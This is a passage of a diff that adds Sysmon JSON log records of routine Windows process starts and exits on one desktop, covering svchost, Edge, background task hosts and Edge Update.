+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:40.432",
+   "ProcessGuid": "10DA3E43-D8AB-63F8-7A00-000000000900",
+   "ProcessId": 1624,
+   "Image": "C:\\Windows\\System32\\RuntimeBroker.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252822.2383249
+   },
+   "EventRecordID": 40,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:42.236",
+   "ProcessGuid": "10DA3E43-D8D0-63F8-9900-000000000900",
+   "ProcessId": 5812,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252837.4655871
+   },
+   "EventRecordID": 41,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:57.458",
+   "ProcessGuid": "10DA3E43-D8E5-63F8-9D00-000000000900",
+   "ProcessId": 6084,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Services",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "svchost.exe",
+   "CommandLine": "C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation -p",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\LOCAL SERVICE",
+   "LogonGuid": "10DA3E43-6525-63F9-E503-000000000000",
+   "LogonId": 997,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252862.2387233
+   },
+   "EventRecordID": 42,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:22.232",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-9E00-000000000900",
+   "ProcessId": 4500,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "FileVersion": "110.0.1587.50",
+   "Description": "Microsoft Edge",
+   "Product": "Microsoft Edge",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedge.exe",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=2132 --field-trial-handle=2184,i,12503708684359893713,13292805670728289041,131072 /prefetch:8",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\110.0.1587.50\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Low",
+   "Hashes": "SHA256=470EA019C1EA8882B258DEA27E77261DD297EB225FD08EDBE591C82796189D75",
+   "ParentProcessGuid": "10DA3E43-D8A8-63F8-7100-000000000900",
+   "ParentProcessId": 4580,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252862.3461487
+   },
+   "EventRecordID": 43,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:22.341",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-9E00-000000000900",
+   "ProcessId": 4500,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.0001392
+   },
+   "EventRecordID": 44,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:22.986",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-A000-000000000900",
+   "ProcessId": 3896,
+   "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Background Task Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "backgroundTaskHost.exe",
+   "CommandLine": "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppX3bn25b6f886wmg6twh46972vprk9tnbf.mca",
+   "CurrentDirectory": "C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "AppContainer",
+   "Hashes": "SHA256=20330D3CA71D58F4AEB432676CB6A3D5B97005954E45132FB083E90782EFDD50",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.000448
+   },
+   "EventRecordID": 45,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:22.984",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-9F00-000000000900",
+   "ProcessId": 3704,
+   "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Background Task Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "backgroundTaskHost.exe",
+   "CommandLine": "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",
+   "CurrentDirectory": "C:\\Windows\\SystemApps\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "AppContainer",
+   "Hashes": "SHA256=20330D3CA71D58F4AEB432676CB6A3D5B97005954E45132FB083E90782EFDD50",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.0150127
+   },
+   "EventRecordID": 46,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:22.996",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-A100-000000000900",
+   "ProcessId": 544,
+   "Image": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\\HxTsr.exe",
+   "FileVersion": "16.0.11629.20238",
+   "Description": "Microsoft Outlook Communications",
+   "Product": "Microsoft Office",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "HxTsr.exe",
+   "CommandLine": "\"C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\\HxTsr.exe\" -ServerName:Hx.IPC.Server",
+   "CurrentDirectory": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "AppContainer",
+   "Hashes": "SHA256=108818ED973CFD2D73C374F6CB461639F39CAF52BC28F8B7CEB7EAB13D5D7B37",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.3994336
+   },
+   "EventRecordID": 47,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:23.391",
+   "ProcessGuid": "10DA3E43-D8FF-63F8-A200-000000000900",
+   "ProcessId": 5416,
+   "Image": "C:\\Windows\\System32\\RuntimeBroker.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Runtime Broker",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "RuntimeBroker.exe",
+   "CommandLine": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=70D968B4F65C5CE471474096F8623AECD7D496E4F10C8B94C3577C8362E0ADA1",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.8951297
+   },
+   "EventRecordID": 48,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:23.892",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-A100-000000000900",
+   "ProcessId": 544,
+   "Image": "C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.11629.20316.0_x64__8wekyb3d8bbwe\\HxTsr.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252863.925168
+   },
+   "EventRecordID": 49,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:23.922",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-9F00-000000000900",
+   "ProcessId": 3704,
+   "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.2210977
+   },
+   "EventRecordID": 50,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.215",
+   "ProcessGuid": "10DA3E43-D902-63F8-A300-000000000900",
+   "ProcessId": 3684,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Services",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "svchost.exe",
+   "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\NETWORK SERVICE",
+   "LogonGuid": "10DA3E43-6524-63F9-E403-000000000000",
+   "LogonId": 996,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.449472
+   },
+   "EventRecordID": 51,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.434",
+   "ProcessGuid": "10DA3E43-D902-63F8-A400-000000000900",
+   "ProcessId": 5140,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+   "FileVersion": "1.3.133.5",
+   "Description": "Microsoft Edge Update",
+   "Product": "Microsoft Edge Update",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedgeupdate.dll",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /svc",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=9991BA022173F283EE99068B708F60AC5143FE0C81C9E3673CC7835B108A4F44",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.5137775
+   },
+   "EventRecordID": 52,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.492",
+   "ProcessGuid": "10DA3E43-D902-63F8-A500-000000000900",
+   "ProcessId": 5152,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.5698369
+   },
+   "EventRecordID": 53,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.537",
+   "ProcessGuid": "10DA3E43-D902-63F8-A600-000000000900",
+   "ProcessId": 5288,
+   "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "WMI Provider Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "Wmiprvse.exe",
+   "CommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\NETWORK SERVICE",
+   "LogonGuid": "10DA3E43-6524-63F9-E403-000000000000",
+   "LogonId": 996,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=2198A7B58BCCB758036B969DDAE6CC2ECE07565E2659A7C541A313A0492231A3",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.7095935
+   },
+   "EventRecordID": 54,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.699",
+   "ProcessGuid": "10DA3E43-D902-63F8-A700-000000000900",
+   "ProcessId": 5444,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+   "FileVersion": "1.3.133.5",
+   "Description": "Microsoft Edge Update",
+   "Product": "Microsoft Edge Update",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedgeupdate.dll",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.173.45\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=9991BA022173F283EE99068B708F60AC5143FE0C81C9E3673CC7835B108A4F44",
+   "ParentProcessGuid": "10DA3E43-D902-63F8-A400-000000000900",
+   "ParentProcessId": 5140,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /svc",
+   "ParentUser": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.7295904
+   },
+   "EventRecordID": 55,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.724",
+   "ProcessGuid": "10DA3E43-D902-63F8-A800-000000000900",
+   "ProcessId": 5440,
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Services",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "svchost.exe",
+   "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\NETWORK SERVICE",
+   "LogonGuid": "10DA3E43-6524-63F9-E403-000000000000",
+   "LogonId": 996,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=643EC58E82E0272C97C2A59F6020970D881AF19C0AD5029DB9C958C13B6558C7",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252866.810128
+   },
+   "EventRecordID": 56,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:34:26.792",
+   "ProcessGuid": "10DA3E43-D902-63F8-A400-000000000900",
+   "ProcessId": 5140,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
